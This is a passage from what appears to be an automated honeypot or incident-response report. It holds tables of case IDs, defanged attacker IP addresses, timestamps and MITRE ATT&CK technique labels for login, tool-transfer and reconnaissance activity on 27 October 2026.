| IR-f8773ef72477 | HIGH | `109.160.32[.]146` | 2026-10-27 06:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-0699ed0eafc2 | HIGH | `164.30.17[.]82` | 2026-10-27 06:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-3c3ade7fdf1f | HIGH | `176.53.159[.]196` | 2026-10-27 06:30 | Y | 0 | 0 | `T1078 · T1592` |
| IR-846bfde1c670 | HIGH | `207.154.203[.]31` | 2026-10-27 06:31 | Y | 2 | 0 | `T1078` |
| IR-b6a78b3dcff2 | HIGH | `138.68.111[.]37` | 2026-10-27 06:31 | Y | 2 | 0 | `T1078` |
| IR-5d70384ac188 | HIGH | `139.59.128[.]145` | 2026-10-27 06:31 | Y | 3 | 0 | `T1078` |
| IR-65a09a6df624 | HIGH | `164.92.176[.]96` | 2026-10-27 06:31 | Y | 2 | 0 | `T1078` |
| IR-106a01dd767a | HIGH | `164.90.186[.]143` | 2026-10-27 06:32 | Y | 2 | 0 | `T1078` |
| IR-0cd44cb2a96c | HIGH | `152.42.223[.]6` | 2026-10-27 06:36 | Y | 37 | 9 | `T1078 · T1105` |
| IR-e167ddf45f66 | HIGH | `15.204.122[.]159` | 2026-10-27 06:37 | Y | 1 | 0 | `T1078 · T1592` |
| IR-1a0bb75b43d8 | HIGH | `77.90.185[.]20` | 2026-10-27 06:37 | Y | 0 | 0 | `T1078 · T1592` |
| IR-100fc318676e | HIGH | `109.160.32[.]48` | 2026-10-27 06:50 | Y | 1 | 0 | `T1078 · T1592` |
| IR-b854dacf3e34 | HIGH | `138.226.239[.]233` | 2026-10-27 06:55 | Y | 0 | 0 | `T1078 · T1592` |
| IR-354f00a42300 | HIGH | `193.112.192[.]91` | 2026-10-27 07:10 | Y | 0 | 0 | `T1078 · T1592` |
| IR-423f656d65bb | HIGH | `4.184.246[.]230` | 2026-10-27 07:20 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-45126ba70bde | HIGH | `4.184.246[.]230` | 2026-10-27 07:20 | Y | 0 | 0 | `T1078 · T1592` |
| IR-da5ef71deffb | HIGH | `129.121.127[.]153` | 2026-10-27 07:21 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-f0236e569eb5 | HIGH | `129.121.127[.]153` | 2026-10-27 07:21 | Y | 0 | 0 | `T1078 · T1592` |
| IR-bd7b38535f10 | HIGH | `181.228.80[.]171` | 2026-10-27 07:22 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-d33a962e9e3e | HIGH | `181.228.80[.]171` | 2026-10-27 07:22 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e9bd57c212ff | HIGH | `60.199.224[.]55` | 2026-10-27 07:22 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-389760325c58 | HIGH | `60.199.224[.]55` | 2026-10-27 07:22 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f5d267c3d947 | HIGH | `129.121.140[.]234` | 2026-10-27 07:24 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-72743ea5ade5 | HIGH | `129.121.140[.]234` | 2026-10-27 07:24 | Y | 0 | 0 | `T1078 · T1592` |
| IR-65511d5b2998 | HIGH | `129.121.116[.]121` | 2026-10-27 07:24 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-35a08bdc7c07 | HIGH | `129.121.116[.]121` | 2026-10-27 07:24 | Y | 0 | 0 | `T1078 · T1592` |
| IR-10f0ea2cae7b | HIGH | `152.32.138[.]230` | 2026-10-27 07:25 | Y | 0 | 0 | `T1078` |
| IR-d27ce5a08e45 | HIGH | `152.32.138[.]230` | 2026-10-27 07:26 | Y | 2 | 0 | `T1078` |
| IR-32ca37d97b87 | HIGH | `81.88.18[.]120` | 2026-10-27 07:31 | Y | 0 | 0 | `T1078` |
| IR-238b8114e813 | HIGH | `50.6.228[.]200` | 2026-10-27 07:42 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-b573c0eae108 | HIGH | `50.6.228[.]200` | 2026-10-27 07:42 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0832fd879488 | HIGH | `74.91.170[.]161` | 2026-10-27 07:43 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-e9b0f6879724 | HIGH | `74.91.170[.]161` | 2026-10-27 07:43 | Y | 0 | 0 | `T1078 · T1592` |
| IR-9416d82f852a | HIGH | `180.167.207[.]234` | 2026-10-27 07:43 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-eb6bbef616db | HIGH | `103.172.28[.]62` | 2026-10-27 07:44 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-6dc93e71c11f | HIGH | `103.172.28[.]62` | 2026-10-27 07:44 | Y | 0 | 0 | `T1078 · T1592` |
| IR-9db3e5148af3 | HIGH | `120.48.80[.]70` | 2026-10-27 07:45 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-8e6238d494dd | HIGH | `120.48.80[.]70` | 2026-10-27 07:45 | Y | 0 | 0 | `T1078 · T1592` |
| IR-72895511dedb | HIGH | `144.31.185[.]241` | 2026-10-27 07:49 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-c69a27c286a4 | HIGH | `144.31.185[.]241` | 2026-10-27 07:49 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f64614a1fc1b | HIGH | `167.99.98[.]129` | 2026-10-27 07:50 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-1b2a1e8c68f9 | HIGH | `167.99.98[.]129` | 2026-10-27 07:50 | Y | 0 | 0 | `T1078 · T1592` |
| IR-2f03bf9c17e2 | HIGH | `118.196.86[.]5` | 2026-10-27 07:50 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-c838cbb29980 | HIGH | `104.244.74[.]84` | 2026-10-27 07:53 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
_… 207 more priority case(s) in ir_cases.json_

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `137.184.169[.]96` | **3** | 2026-10-27 09:26 | 2026-10-27 12:11 | 3m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **3** | 2026-10-27 00:58 | 2026-10-27 04:03 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **3** | 2026-10-27 10:21 | 2026-10-27 14:01 | 0m | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]118` | **2** | 2026-10-27 09:34 | 2026-10-27 11:10 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `109.160.32[.]146` | **2** | 2026-10-27 03:07 | 2026-10-27 04:50 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `109.160.32[.]48` | **2** | 2026-10-27 06:49 | 2026-10-27 08:00 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `125.140.60[.]32` | **2** | 2026-10-27 05:03 | 2026-10-27 06:04 | 0m | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | **2** | 2026-10-27 03:22 | 2026-10-27 04:22 | 4m | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | **2** | 2026-10-27 14:38 | 2026-10-27 16:25 | 2m | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | **2** | 2026-10-27 04:12 | 2026-10-27 06:01 | 0m | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | **2** | 2026-10-27 10:47 | 2026-10-27 12:46 | 1m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **2** | 2026-10-27 06:18 | 2026-10-27 08:08 | 0m | 0 | `T1592` | 🟢 LOW |
| `143.198.208[.]150` | **2** | 2026-10-27 08:44 | 2026-10-27 10:36 | 1m | 0 | `T1592` | 🟢 LOW |
| `180.175.161[.]246` | **2** | 2026-10-27 03:46 | 2026-10-27 04:02 | 0m | 0 | `T1592` | 🟢 LOW |
| `193.112.192[.]91` | **2** | 2026-10-27 05:16 | 2026-10-27 07:10 | 0m | 0 | `T1592` | 🟢 LOW |
| `58.221.60[.]25` | **2** | 2026-10-27 09:05 | 2026-10-27 10:19 | 4m | 0 | `T1592` | 🟢 LOW |
| `71.90.30[.]53` | **2** | 2026-10-27 13:46 | 2026-10-27 15:00 | 0m | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]50` | **2** | 2026-10-27 07:57 | 2026-10-27 08:22 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `101.126.141[.]163` | 1 | 2026-10-27 13:28 | 2026-10-27 13:30 | 120s | 0 | `T1592` | 🟢 LOW |
| `101.201.234[.]37` | 1 | 2026-10-27 14:54 | 2026-10-27 14:54 | 43s | 0 | `T1592` | 🟢 LOW |
| `101.96.195[.]62` | 1 | 2026-10-27 08:57 | 2026-10-27 08:59 | 96s | 0 | `T1592` | 🟢 LOW |
| `101.96.196[.]243` | 1 | 2026-10-27 05:19 | 2026-10-27 05:19 | 15s | 0 | `T1592` | 🟢 LOW |
| `101.96.202[.]144` | 1 | 2026-10-27 10:09 | 2026-10-27 10:09 | 15s | 0 | `T1592` | 🟢 LOW |
| `102.201.139[.]166` | 1 | 2026-10-27 13:08 | 2026-10-27 13:09 | 13s | 0 | `T1592` | 🟢 LOW |
| `102.204.176[.]41` | 1 | 2026-10-27 01:48 | 2026-10-27 01:48 | 13s | 0 | `T1592` | 🟢 LOW |
| `102.38.127[.]146` | 1 | 2026-10-27 08:33 | 2026-10-27 08:33 | 13s | 0 | `T1592` | 🟢 LOW |
| `103.146.170[.]120` | 1 | 2026-10-27 09:12 | 2026-10-27 09:13 | 13s | 0 | `T1592` | 🟢 LOW |
| `103.203.172[.]81` | 1 | 2026-10-27 15:21 | 2026-10-27 15:21 | 13s | 0 | `T1592` | 🟢 LOW |
| `103.76.103[.]168` | 1 | 2026-10-27 02:49 | 2026-10-27 02:50 | 13s | 0 | `T1592` | 🟢 LOW |
| `104.155.49[.]21` | 1 | 2026-10-27 04:43 | 2026-10-27 04:43 | 6s | 0 | `T1592` | 🟢 LOW |
| `104.248.54[.]83` | 1 | 2026-10-27 16:38 | 2026-10-27 16:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `105.184.9[.]36` | 1 | 2026-10-27 05:15 | 2026-10-27 05:15 | 13s | 0 | `T1592` | 🟢 LOW |
| `106.12.172[.]151` | 1 | 2026-10-27 08:58 | 2026-10-27 09:00 | 120s | 0 | `T1592` | 🟢 LOW |
| `106.13.48[.]117` | 1 | 2026-10-27 04:34 | 2026-10-27 04:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `106.227.76[.]197` | 1 | 2026-10-27 07:26 | 2026-10-27 07:28 | 120s | 0 | `T1592` | 🟢 LOW |
| `106.75.77[.]231` | 1 | 2026-10-27 07:54 | 2026-10-27 07:56 | 120s | 0 | `T1592` | 🟢 LOW |
| `111.127.79[.]168` | 1 | 2026-10-27 07:26 | 2026-10-27 07:26 | 14s | 0 | `T1592` | 🟢 LOW |
| `112.103.130[.]172` | 1 | 2026-10-27 13:46 | 2026-10-27 13:46 | 13s | 0 | `T1592` | 🟢 LOW |
| `114.220.238[.]21` | 1 | 2026-10-27 10:07 | 2026-10-27 10:09 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.190.179[.]68` | 1 | 2026-10-27 08:57 | 2026-10-27 08:58 | 91s | 0 | `T1592` | 🟢 LOW |
| `115.191.23[.]138` | 1 | 2026-10-27 09:26 | 2026-10-27 09:28 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.252.244[.]129` | 1 | 2026-10-27 09:09 | 2026-10-27 09:09 | 15s | 0 | `T1592` | 🟢 LOW |
| `118.145.238[.]115` | 1 | 2026-10-27 05:02 | 2026-10-27 05:04 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.196.86[.]5` | 1 | 2026-10-27 07:47 | 2026-10-27 07:49 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.196.86[.]5` | 1 | 2026-10-27 10:27 | 2026-10-27 10:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `119.167.206[.]194` | 1 | 2026-10-27 04:56 | 2026-10-27 04:58 | 120s | 0 | `T1592` | 🟢 LOW |
| `119.199.176[.]30` | 1 | 2026-10-27 09:00 | 2026-10-27 09:00 | 24s | 0 | `T1592` | 🟢 LOW |
| `119.96.159[.]237` | 1 | 2026-10-27 00:57 | 2026-10-27 00:57 | 301s | 0 | `T1592` | 🟢 LOW |
| `120.26.83[.]180` | 1 | 2026-10-27 02:16 | 2026-10-27 02:16 | 1s | 0 | `T1592` | 🟢 LOW |
| `120.92.112[.]77` | 1 | 2026-10-27 03:48 | 2026-10-27 03:50 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.155.6[.]214` | 1 | 2026-10-27 08:18 | 2026-10-27 08:19 | 27s | 0 | `T1592` | 🟢 LOW |
| `121.187.53[.]248` | 1 | 2026-10-27 13:26 | 2026-10-27 13:26 | 27s | 0 | `T1592` | 🟢 LOW |
| `122.97.137[.]229` | 1 | 2026-10-27 01:45 | 2026-10-27 01:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `123.165.152[.]110` | 1 | 2026-10-27 01:18 | 2026-10-27 01:18 | 13s | 0 | `T1592` | 🟢 LOW |
| `124.43.10[.]224` | 1 | 2026-10-27 10:36 | 2026-10-27 10:38 | 120s | 0 | `T1592` | 🟢 LOW |
| `131.100.223[.]175` | 1 | 2026-10-27 04:39 | 2026-10-27 04:39 | 12s | 0 | `T1592` | 🟢 LOW |
| `131.226.2[.]59` | 1 | 2026-10-27 16:39 | 2026-10-27 16:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `134.33.66[.]248` | 1 | 2026-10-27 07:44 | 2026-10-27 07:44 | 9s | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | 1 | 2026-10-27 06:55 | 2026-10-27 06:57 | 121s | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | 1 | 2026-10-27 00:56 | 2026-10-27 00:57 | 56s | 0 | `T1592` | 🟢 LOW |
| `137.184.60[.]85` | 1 | 2026-10-27 02:47 | 2026-10-27 02:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `138.68.111[.]37` | 1 | 2026-10-27 06:31 | 2026-10-27 06:32 | 2s | 0 | `T1592` | 🟢 LOW |
| `138.68.81[.]99` | 1 | 2026-10-27 06:31 | 2026-10-27 06:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | 1 | 2026-10-27 16:21 | 2026-10-27 16:21 | 0s | 0 | `T1592` | 🟢 LOW |
| `14.103.118[.]25` | 1 | 2026-10-27 09:04 | 2026-10-27 09:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `152.32.138[.]230` | 1 | 2026-10-27 07:25 | 2026-10-27 07:25 | 0s | 0 | `T1592` | 🟢 LOW |
| `152.42.223[.]6` | 1 | 2026-10-27 01:45 | 2026-10-27 01:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `152.42.223[.]6` | 1 | 2026-10-27 06:03 | 2026-10-27 06:03 | 6s | 1 | `T1110.001` | 🟢 LOW |
| `152.42.223[.]6` | 1 | 2026-10-27 08:07 | 2026-10-27 08:07 | 11s | 1 | `T1110.001` | 🟢 LOW |
| `152.42.223[.]6` | 1 | 2026-10-27 10:54 | 2026-10-27 10:54 | 5s | 1 | `T1110.001` | 🟢 LOW |
| `152.42.223[.]6` | 1 | 2026-10-27 15:10 | 2026-10-27 15:11 | 5s | 1 | `T1110.001` | 🟢 LOW |
| `163.125.145[.]196` | 1 | 2026-10-27 12:21 | 2026-10-27 12:23 | 120s | 0 | `T1592` | 🟢 LOW |
| `164.92.176[.]96` | 1 | 2026-10-27 06:31 | 2026-10-27 06:32 | 22s | 0 | `T1592` | 🟢 LOW |
| `171.113.161[.]106` | 1 | 2026-10-27 16:10 | 2026-10-27 16:11 | 13s | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]202` | 1 | 2026-10-27 05:38 | 2026-10-27 05:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.94.9[.]74` | 1 | 2026-10-27 12:28 | 2026-10-27 12:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `175.10.100[.]162` | 1 | 2026-10-27 14:48 | 2026-10-27 14:48 | 12s | 0 | `T1592` | 🟢 LOW |
| `175.100.21[.]20` | 1 | 2026-10-27 09:01 | 2026-10-27 09:01 | 12s | 0 | `T1592` | 🟢 LOW |
| `175.8.140[.]48` | 1 | 2026-10-27 09:26 | 2026-10-27 09:26 | 13s | 0 | `T1592` | 🟢 LOW |
| `178.128.121[.]154` | 1 | 2026-10-27 10:26 | 2026-10-27 10:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `180.153.91[.]15` | 1 | 2026-10-27 16:02 | 2026-10-27 16:04 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.167.207[.]234` | 1 | 2026-10-27 13:32 | 2026-10-27 13:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.175.161[.]246` | 1 | 2026-10-27 07:02 | 2026-10-27 07:02 | 26s | 0 | `T1592` | 🟢 LOW |
| `180.76.146[.]178` | 1 | 2026-10-27 09:03 | 2026-10-27 09:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.60[.]83` | 1 | 2026-10-27 00:59 | 2026-10-27 01:01 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.93.193[.]100` | 1 | 2026-10-27 01:34 | 2026-10-27 01:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `180.93.193[.]100` | 1 | 2026-10-27 06:46 | 2026-10-27 06:48 | 82s | 0 | `T1592` | 🟢 LOW |
| `181.98.129[.]244` | 1 | 2026-10-27 06:03 | 2026-10-27 06:03 | 10s | 0 | `T1592` | 🟢 LOW |
| `183.232.212[.]207` | 1 | 2026-10-27 16:11 | 2026-10-27 16:13 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.56.197[.]63` | 1 | 2026-10-27 07:44 | 2026-10-27 07:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.56.216[.]153` | 1 | 2026-10-27 05:05 | 2026-10-27 05:07 | 120s | 0 | `T1592` | 🟢 LOW |
| `185.242.226[.]17` | 1 | 2026-10-27 02:48 | 2026-10-27 02:48 | 10s | 0 | `T1592` | 🟢 LOW |
| `187.17.237[.]123` | 1 | 2026-10-27 03:41 | 2026-10-27 03:41 | 12s | 0 | `T1592` | 🟢 LOW |
| `189.89.80[.]82` | 1 | 2026-10-27 16:51 | 2026-10-27 16:51 | 13s | 0 | `T1592` | 🟢 LOW |
| `189.89.93[.]254` | 1 | 2026-10-27 08:59 | 2026-10-27 08:59 | 12s | 0 | `T1592` | 🟢 LOW |
| `192.248.150[.]180` | 1 | 2026-10-27 08:44 | 2026-10-27 08:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.112.192[.]91` | 1 | 2026-10-27 02:05 | 2026-10-27 02:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.112.192[.]91` | 1 | 2026-10-27 12:40 | 2026-10-27 12:42 | 120s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `193.47.62[.]69` | 1 | 2026-10-27 01:06 | 2026-10-27 01:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.47.62[.]69` | 1 | 2026-10-27 10:06 | 2026-10-27 10:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `194.164.107[.]6` | 1 | 2026-10-27 02:09 | 2026-10-27 02:10 | 14s | 0 | `T1592` | 🟢 LOW |
| `196.115.221[.]55` | 1 | 2026-10-27 12:11 | 2026-10-27 12:11 | 0s | 0 | `T1592` | 🟢 LOW |
| `199.165.159[.]113` | 1 | 2026-10-27 01:31 | 2026-10-27 01:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `199.165.159[.]81` | 1 | 2026-10-27 06:40 | 2026-10-27 06:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]150` | 1 | 2026-10-27 13:02 | 2026-10-27 13:03 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `2.57.122[.]168` | 1 | 2026-10-27 02:53 | 2026-10-27 02:53 | 16s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `2.57.122[.]209` | 1 | 2026-10-27 04:19 | 2026-10-27 04:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]238` | 1 | 2026-10-27 03:38 | 2026-10-27 03:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]238` | 1 | 2026-10-27 16:51 | 2026-10-27 16:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `20.112.236[.]52` | 1 | 2026-10-27 16:42 | 2026-10-27 16:42 | 9s | 0 | `T1592` | 🟢 LOW |
| `20.121.140[.]118` | 1 | 2026-10-27 09:47 | 2026-10-27 09:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `20.121.64[.]198` | 1 | 2026-10-27 02:12 | 2026-10-27 02:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `20.168.116[.]148` | 1 | 2026-10-27 09:52 | 2026-10-27 09:52 | 9s | 0 | `T1592` | 🟢 LOW |
| `205.185.118[.]115` | 1 | 2026-10-27 03:13 | 2026-10-27 03:13 | 4s | 0 | `T1592` | 🟢 LOW |
| `207.175.21[.]206` | 1 | 2026-10-27 04:03 | 2026-10-27 04:03 | 13s | 0 | `T1592` | 🟢 LOW |
| `210.91.153[.]182` | 1 | 2026-10-27 12:10 | 2026-10-27 12:11 | 22s | 0 | `T1592` | 🟢 LOW |
| `213.81.162[.]175` | 1 | 2026-10-27 10:55 | 2026-10-27 10:55 | 13s | 0 | `T1592` | 🟢 LOW |
| `218.78.141[.]57` | 1 | 2026-10-27 07:55 | 2026-10-27 07:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `220.154.131[.]111` | 1 | 2026-10-27 13:35 | 2026-10-27 13:37 | 120s | 0 | `T1592` | 🟢 LOW |
| `221.144.221[.]177` | 1 | 2026-10-27 05:46 | 2026-10-27 05:46 | 27s | 0 | `T1592` | 🟢 LOW |
| `222.117.7[.]182` | 1 | 2026-10-27 08:28 | 2026-10-27 08:29 | 21s | 0 | `T1592` | 🟢 LOW |
| `24.46.241[.]244` | 1 | 2026-10-27 09:19 | 2026-10-27 09:21 | 120s | 0 | `T1592` | 🟢 LOW |
| `27.0.135[.]12` | 1 | 2026-10-27 10:53 | 2026-10-27 10:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `3.130.168[.]2` | 1 | 2026-10-27 01:34 | 2026-10-27 01:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `3.131.220[.]121` | 1 | 2026-10-27 16:53 | 2026-10-27 16:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `3.86.210[.]219` | 1 | 2026-10-27 01:26 | 2026-10-27 01:26 | 2s | 0 | `T1592` | 🟢 LOW |
| `34.76.152[.]98` | 1 | 2026-10-27 03:40 | 2026-10-27 03:40 | 3s | 0 | `T1592` | 🟢 LOW |
| `34.79.254[.]110` | 1 | 2026-10-27 04:31 | 2026-10-27 04:31 | 6s | 0 | `T1592` | 🟢 LOW |
| `35.187.70[.]55` | 1 | 2026-10-27 04:32 | 2026-10-27 04:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `36.111.40[.]138` | 1 | 2026-10-27 09:04 | 2026-10-27 09:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `38.110.46[.]238` | 1 | 2026-10-27 16:53 | 2026-10-27 16:54 | 60s | 0 | `T1592` | 🟢 LOW |
| `42.51.41[.]137` | 1 | 2026-10-27 08:54 | 2026-10-27 08:56 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.115.26[.]155` | 1 | 2026-10-27 15:15 | 2026-10-27 15:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.115.26[.]40` | 1 | 2026-10-27 15:39 | 2026-10-27 15:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]151` | 1 | 2026-10-27 13:04 | 2026-10-27 13:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]152` | 1 | 2026-10-27 04:04 | 2026-10-27 04:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.77.61[.]56` | 1 | 2026-10-27 09:44 | 2026-10-27 09:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.128[.]205` | 1 | 2026-10-27 08:42 | 2026-10-27 08:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `46.191.141[.]152` | 1 | 2026-10-27 05:15 | 2026-10-27 05:17 | 120s | 0 | `T1592` | 🟢 LOW |
| `49.232.142[.]15` | 1 | 2026-10-27 13:28 | 2026-10-27 13:30 | 88s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]142` | 1 | 2026-10-27 05:26 | 2026-10-27 05:26 | 4s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]17` | 1 | 2026-10-27 01:35 | 2026-10-27 01:35 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]2` | 1 | 2026-10-27 01:13 | 2026-10-27 01:13 | 2s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]190` | 1 | 2026-10-27 06:39 | 2026-10-27 06:40 | 16s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]34` | 1 | 2026-10-27 04:42 | 2026-10-27 04:42 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]43` | 1 | 2026-10-27 07:14 | 2026-10-27 07:14 | 2s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]171` | 1 | 2026-10-27 05:45 | 2026-10-27 05:45 | 1s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]185` | 1 | 2026-10-27 06:40 | 2026-10-27 06:40 | 16s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]106` | 1 | 2026-10-27 12:37 | 2026-10-27 12:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]108` | 1 | 2026-10-27 07:54 | 2026-10-27 07:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]114` | 1 | 2026-10-27 06:39 | 2026-10-27 06:39 | 14s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]57` | 1 | 2026-10-27 04:41 | 2026-10-27 04:41 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]99` | 1 | 2026-10-27 04:42 | 2026-10-27 04:42 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.228.62[.]150` | 1 | 2026-10-27 01:44 | 2026-10-27 01:44 | 3s | 0 | `T1592` | 🟢 LOW |
| `66.228.62[.]150` | 1 | 2026-10-27 07:37 | 2026-10-27 07:37 | 3s | 0 | `T1592` | 🟢 LOW |
| `68.183.96[.]213` | 1 | 2026-10-27 05:14 | 2026-10-27 05:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `71.6.146[.]130` | 1 | 2026-10-27 07:15 | 2026-10-27 07:15 | 1s | 0 | `T1592` | 🟢 LOW |
| `71.6.232[.]28` | 1 | 2026-10-27 01:19 | 2026-10-27 01:19 | 7s | 0 | `T1592` | 🟢 LOW |
| `73.15.162[.]66` | 1 | 2026-10-27 05:52 | 2026-10-27 05:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `74.249.194[.]1` | 1 | 2026-10-27 09:20 | 2026-10-27 09:20 | 0s | 0 | `T1592` | 🟢 LOW |
| `74.72.230[.]154` | 1 | 2026-10-27 06:23 | 2026-10-27 06:23 | 12s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-10-27 06:40 | 2026-10-27 06:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]54` | 1 | 2026-10-27 16:08 | 2026-10-27 16:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `78.174.18[.]157` | 1 | 2026-10-27 11:58 | 2026-10-27 11:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `8.152.209[.]0` | 1 | 2026-10-27 06:09 | 2026-10-27 06:11 | 120s | 0 | `T1592` | 🟢 LOW |
| `8.152.209[.]0` | 1 | 2026-10-27 13:19 | 2026-10-27 13:19 | 9s | 0 | `T1592` | 🟢 LOW |
| `81.88.18[.]120` | 1 | 2026-10-27 07:32 | 2026-10-27 07:32 | 14s | 0 | `T1592` | 🟢 LOW |
| `86.202.166[.]84` | 1 | 2026-10-27 13:50 | 2026-10-27 13:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `87.236.176[.]138` | 1 | 2026-10-27 14:09 | 2026-10-27 14:09 | 2s | 0 | `T1592` | 🟢 LOW |
| `87.236.176[.]226` | 1 | 2026-10-27 11:53 | 2026-10-27 11:53 | 1s | 0 | `T1592` | 🟢 LOW |
| `87.236.176[.]246` | 1 | 2026-10-27 07:49 | 2026-10-27 07:49 | 1s | 0 | `T1592` | 🟢 LOW |
| `87.244.128[.]123` | 1 | 2026-10-27 08:43 | 2026-10-27 08:43 | 14s | 0 | `T1592` | 🟢 LOW |
| `87.6.178[.]97` | 1 | 2026-10-27 16:38 | 2026-10-27 16:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `88.178.40[.]196` | 1 | 2026-10-27 04:34 | 2026-10-27 04:35 | 13s | 0 | `T1592` | 🟢 LOW |
| `91.222.16[.]167` | 1 | 2026-10-27 02:47 | 2026-10-27 02:47 | 0s | 0 | `T1592` | 🟢 LOW |
